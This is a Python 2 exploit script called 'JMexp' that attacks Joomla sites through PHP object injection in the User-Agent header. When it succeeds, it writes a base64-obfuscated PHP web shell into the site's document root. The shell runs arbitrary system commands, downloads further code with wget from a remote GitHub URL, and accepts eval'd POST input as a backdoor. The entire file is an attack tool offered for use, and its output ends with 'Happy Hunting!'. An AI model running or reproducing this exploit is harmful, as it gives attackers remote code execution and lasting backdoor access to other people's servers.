# !/usr/bin/python
# coding=utf-8
# thanks for nlfox
# fixed by evil7
# 2015/12/16

import urllib
import re
import os
__author__ = 'nlfox233'
import urllib2
import cookielib
import sys

site = sys.argv[1]

os.system('clear')
print "     _ __  __"
print "    | |  \/  | _____  ___ __"
print " _  | | |\/| |/ _ \ \/ / '_ \\"
print "| |_| | |  | |  __/>  <| |_) |"
print " \___/|_|  |_|\___/_/\_\ .__/"
print "                       |_|   v:2015.12.16"
print ""
print "  >> JMexp running..."

code = "file_put_contents($_SERVER['DOCUMENT_ROOT'].'/JMexp.php',base64_decode('PGNlbnRlcj48aDE+Ojo6WyBSZWZyZXNoIHRoaXMgd2Vic2hlbGwgXTo6OjwvaDE+PGJyPjxicj5JZiBzZWUgdGhpcyB3b3JkcyBhZ2FpbiBhZnRlciByZWZyZXNoLjxicj5QbGVhc2UgdXNlICIxY29kZSIgY29ubmVjdCB0aGlzIHdlYnNoZWxsLjxicj4xY29kZTogSk1leHA8L2NlbnRlcj48P3BocCAkYyA9IGJhc2U2NF9kZWNvZGUoImQyZGxkQ0F0VHlCS1RXVjRjQzV3YUhBZ2FIUjBjSE02THk5eVlYY3VaMmwwYUhWaWRYTmxjbU52Ym5SbGJuUXVZMjl0TDJWMmFXdzNMMnB2YjIxc1lWOWxlSEF2YldGemRHVnlMMHBOWlhod0xuQm9jQT09Iik7IEBzZXRfdGltZV9saW1pdCgwKTsgQGlnbm9yZV91c2VyX2Fib3J0KDEpOyBAaW5pX3NldCgnbWF4X2V4ZWN1dGlvbl90aW1lJywwKTsgJEd3Znhmb0k9QGluaV9nZXQoJ2Rpc2FibGVfZnVuY3Rpb25zJyk7IGlmKCFlbXB0eSgkR3dmeGZvSSkpeyAkR3dmeGZvST1wcmVnX3JlcGxhY2UoJy9bLCBdKy8nLCAnLCcsICRHd2Z4Zm9JKTsgJEd3Znhmb0k9ZXhwbG9kZSgnLCcsICRHd2Z4Zm9JKTsgJEd3Znhmb0k9YXJyYXlfbWFwKCd0cmltJywgJEd3Znhmb0kpOyB9ZWxzZXsgJEd3Znhmb0k9YXJyYXkoKTsgfSBpZiAoRkFMU0UgIT09IHN0cnBvcyhzdHJ0b2xvd2VyKFBIUF9PUyksICd3aW4nICkpIHsgJGM9JGMuIiAyPiYxXG4iOyB9ICRZaUlOUVc9J2lzX2NhbGxhYmxlJzsgJGtlZmVSaD0naW5fYXJyYXknOyBpZigkWWlJTlFXKCdzaGVsbF9leGVjJylhbmQhJGtlZmVSaCgnc2hlbGxfZXhlYycsJEd3Znhmb0kpKXsgJGppT2ZqeT1zaGVsbF9leGVjKCRjKTsgfWVsc2UgaWYoJFlpSU5RVygncG9wZW4nKWFuZCEka2VmZVJoKCdwb3BlbicsJEd3Znhmb0kpKXsgJGZwPXBvcGVuKCRjLCdyJyk7ICRqaU9mank9TlVMTDsgaWYoaXNfcmVzb3VyY2UoJGZwKSl7IHdoaWxlKCFmZW9mKCRmcCkpeyAkamlPZmp5Lj1mcmVhZCgkZnAsMTAyNCk7IH0gfSBAcGNsb3NlKCRmcCk7IH1lbHNlIGlmKCRZaUlOUVcoJ3Byb2Nfb3BlbicpYW5kISRrZWZlUmgoJ3Byb2Nfb3BlbicsJEd3Znhmb0kpKXsgJGhhbmRsZT1wcm9jX29wZW4oJGMsYXJyYXkoYXJyYXkocGlwZSwncicpLGFycmF5KHBpcGUsJ3cnKSxhcnJheShwaXBlLCd3JykpLCRwaXBlcyk7ICRqaU9mank9TlVMTDsgd2hpbGUoIWZlb2YoJHBpcGVzWzFdKSl7ICRqaU9mankuPWZyZWFkKCRwaXBlc1sxXSwxMDI0KTsgfSBAcHJvY19jbG9zZSgkaGFuZGxlKTsgfWVsc2UgaWYoJFlpSU5RVygncGFzc3RocnUnKWFuZCEka2VmZVJoKCdwYXNzdGhydScsJEd3Znhmb0kpKXsgb2Jfc3RhcnQoKTsgcGFzc3RocnUoJGMpOyAkamlPZmp5PW9iX2dldF9jb250ZW50cygpOyBvYl9lbmRfY2xlYW4oKTsgfWVsc2UgaWYoJFlpSU5RVygnc3lzdGVtJylhbmQhJGtlZmVSaCgnc3lzdGVtJywkR3dmeGZvSSkpeyBvYl9zdGFydCgpOyBzeXN0ZW0oJGMpOyAkamlPZmp5PW9iX2dldF9jb250ZW50cygpOyBvYl9lbmRfY2xlYW4oKTsgfWVsc2UgaWYoJFlpSU5RVygnZXhlYycpYW5kISRrZWZlUmgoJ2V4ZWMnLCRHd2Z4Zm9JKSl7ICRqaU9mank9YXJyYXkoKTsgZXhlYygkYywkamlPZmp5KTsgJGppT2ZqeT1qb2luKGNocigxMCksJGppT2ZqeSkuY2hyKDEwKTsgfWVsc2UgeyAkamlPZmp5PTA7IH0/Pjw/cGhwIEBldmFsKCRfUE9TVFtKTWV4cF0pOz8+'))"

url = site + '?1=' + urllib.quote("@ini_set(\"display_errors\",\"0\");@set_time_limit(0);@set_magic_quotes_runtime(0);echo '->|';" + code + ";echo '|<-';")
cj = cookielib.CookieJar()
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
urllib2.install_opener(opener)
urllib2.socket.setdefaulttimeout(10)

ua = '}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\x5C0\x5C0\x5C0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";s:46:"eval($_REQUEST[1]);JFactory::getConfig();exit;";s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\x5C0\x5C0\x5C0connection";b:1;}\xF0\x9D\x8C\x86'
req = urllib2.Request(url=url, headers={'User-Agent': ua})
opener.open(req)
req = urllib2.Request(url=url)
res = opener.open(req).read()

print ""
print "  >> All done ! Job Success !"
print ""
print "  >> Webshell at " + site + "/JMexp.php"
print ""
print "  >> Go on and refurbish webshell to use more!"
print ""
print "  >> If webshell not work at last. you can use it as 1CodeShell with code: [ JMexp ]"
print ""
print "  >> Happy Hunting! :P"
print ""
